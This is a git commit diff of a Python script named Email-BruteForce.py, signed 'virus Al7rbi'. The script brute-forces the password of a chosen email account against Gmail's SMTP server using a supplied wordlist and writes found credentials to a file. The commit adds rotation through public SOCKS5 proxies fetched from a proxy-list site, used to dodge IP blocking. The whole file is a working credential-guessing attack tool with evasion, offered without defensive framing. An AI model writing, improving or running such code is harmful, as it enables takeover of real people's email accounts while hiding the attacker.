8c6b7368c7dba917ab49e7d6304b390c5c19d6ca
virus al7rbi <35959050+virusAl7rbi@users.noreply.github.com>
2021-03-01 11:09:56 +0300

    Update Email-BruteForce.py

--- Email-BruteForce.py
+++ Email-BruteForce.py
@@ -1,36 +1,41 @@
+from threading import Thread
+from random import choice
+import requests
 import smtplib
-import sys
-import time
 import socks
-from threading import Thread, Timer
-
+import time
+import sys
 virus = """
 
-       .__                       
+       .__
 ___  __|__|_______  __ __  ______
 \  \/ /|  |\_  __ \|  |  \/  ___/
- \   / |  | |  | \/|  |  /\___ \ 
+ \   / |  | |  | \/|  |  /\___ \
   \_/  |__| |__|   |____//____  >
-                              \/ 
+                              \/
 made by virus Al7rbi :)
 """
 print(virus)
 
 
+
+
+
 #change ip
 def ip_changer():
     while True:
-        socks.setdefaultproxy(socks.SOCKS5, 'localhost', 9050)
+        r = requests.get('https://www.proxy-list.download/api/v1/get?type=socks5').text
+        proxy = str(choice(r.splitlines())).split(':')
+        socks.setdefaultproxy(socks.SOCKS5, proxy[0], int(proxy[1]))
         socks.wrapmodule(smtplib)
         time.sleep(5)
+        print(f'[!]IP CHANGED TO {proxy[0]}')
 
 
 #static
-ServerPort = input("input server | server:port: ")
-ServerPort = str(ServerPort)
 try:
-    server = smtplib.SMTP(ServerPort)
-    server.ehlo()
+    server = smtplib.SMTP('smtp.gmail.com:587')
+    # server.ehlo()
     server.starttls()
     print('[*]Connected')
 except Exception:
@@ -39,34 +44,35 @@ except Exception:
 username = input("Email : ")
 File = input("passwords list: ")
 password = open(File).read().splitlines()
-amount = len(password)
+amount = str(len(password))
 
 
 def hack():
-    print('[*]start trying , try (' + str(amount) + ')password')
+    print(f'[*]start trying , try ({amount})password')
 
     for passwd in password:
         try:
             server.login(username, passwd)
             combination = (username + ":" + passwd)
-            print('[*]Found : {}'.format(combination))
+            print(f'[*]Found : {combination}')
             break
         except smtplib.SMTPAuthenticationError as msg:
             if msg.smtp_code == 534:
-                print('[*] Get it ({})'.format(passwd))
+                print(f'[*] Get it ({passwd})')
                 password_is = open('passwords.txt', 'a')
-                password_is.write("{}:{}".format(username, passwd))
+                password_is.write(f"{username}:{passwd}")
                 password_is.close()
                 print('the password in the file')
                 sys.exit()
             elif msg.smtp_code == 535:
-                print("[×]Not this ({}) ".format(passwd))
+                print(f"[×]Not this ({passwd})")
                 time.sleep(0.5)
             elif msg.smtp_code == 553:
                 print('[!]Email Error')
         except smtplib.SMTPServerDisconnected as dis:
             if dis == 'Connection unexpectedly closed':
-                print('Connection unexpectedly closed ...')
+                print('[!]Connection unexpectedly closed ...')
+
 
 
 
